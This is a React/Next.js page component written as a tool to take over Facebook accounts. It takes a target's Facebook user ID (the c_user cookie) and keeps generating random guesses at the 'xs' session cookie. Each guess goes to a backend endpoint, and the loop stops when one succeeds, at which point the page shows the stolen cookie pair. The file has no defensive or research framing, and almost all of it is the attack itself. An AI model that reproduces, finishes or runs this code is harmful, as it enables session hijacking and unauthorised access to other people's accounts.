"use client"
import { useState } from "react";
import styles from "./page.module.css";
export default function Home() {
  const [inputUserID, setInputUserID] = useState("")
  const [inputXS, setInputXS] = useState("")
  const [outputMSG, setOutputMSG] = useState("Enter User ID :-")
  const [isStart, setIsStart] = useState(false)
  const [isDone, setIsDone] = useState(false)

  let outputArry = [0, 0, 0]
  async function Start() {
    if (isStart) return;
    if (!inputUserID) {
      setOutputMSG("Enter User ID :-\n\n============ Please Enter C_User FB ============")
      return
    }
    setIsStart(true)
    setIsDone(false)
    let cont = 0
    let status = "Fall"
    do {
      cont++
      let newCookiesWord = new_word(inputXS ? inputXS : 1)
      status = await send_req(newCookiesWord, cont)
      control_output(cont, newCookiesWord, status)
    } while (status == "Fall");
    setIsStart(false)

  }
  async function send_req(newCookiesWord, cont) {
    let word = newCookiesWord
    // if (cont == 100) word = newCookiesWord;
    // if (cont == 100) return "Done";
    let status = "Fall"
    await fetch(`/api/test?c_user=${inputUserID}&xs=${word}`, {
    }).then(async (response) => {
      status = await response.json()
    })

    return status
  }
  function control_output(conter, cookiesWorde, status) {
    if (status == "Done") {
      let text = "DONE || DONE || DONE\n\n"
      text += '"_"   "_"   "_"   "_"\n\n'
      text += `User ID = ${inputUserID}\n\n`
      text += `Cookies = ${cookiesWorde}`
      setIsDone(true)
      setOutputMSG(text)
      return
    }
    let text = `User ID = ${inputUserID}`
    let itme = `\n\n${conter} || ${cookiesWorde} || ${status}`
    if (!outputArry[0]) {
      text += itme
      outputArry[0] = itme
    } else if (!outputArry[1]) {
      text += outputArry[0] + itme
      outputArry[1] = itme
    }
    else if (!outputArry[2]) {
      text += outputArry[0] + outputArry[1] + itme
      outputArry[2] = itme
    } else {
      outputArry[0] = outputArry[1]
      outputArry[1] = outputArry[2]
      outputArry[2] = itme
      text += outputArry[0] + outputArry[1] + outputArry[2]
    }
    setOutputMSG(text)
  }
  return (
    <div>
      <div className={styles.navBar}>JS</div>
      <div className={styles.contenier}>
        <input type="number" value={inputUserID} onChange={(e) => (setInputUserID(e.target.value))} placeholder="Facebook ID" />
        <input type="number" value={inputXS} onChange={(e) => (setInputXS(e.target.value))} placeholder="Login Time" />
        <button className={isStart ? styles.btnSatrtin : null} onClick={Start}>{isStart ? "Starting.." : "Start"}</button>
        <textarea className={isDone ? styles.Done : null} value={outputMSG} readOnly ></textarea>
      </div>
    </div>
  );
}
function new_word(num = 1) {

  let numLen = 10;
  if (num) numLen = 10 - num.toString().length;
  let str = `${getRandomInt(10, 50)}:${makeid(14)}:2${num ? ":" + num : ":"
    }${rnNum(numLen)}`;
  return str;


  function makeid(length) {
    let result = "";
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789-_";
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < length) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
      counter += 1;
    }
    return result;
  }
  function rnNum(length) {
    let result = "";
    const characters = "1234567890";
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < length) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
      counter += 1;
    }
    return result;
  }
  function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
  }
}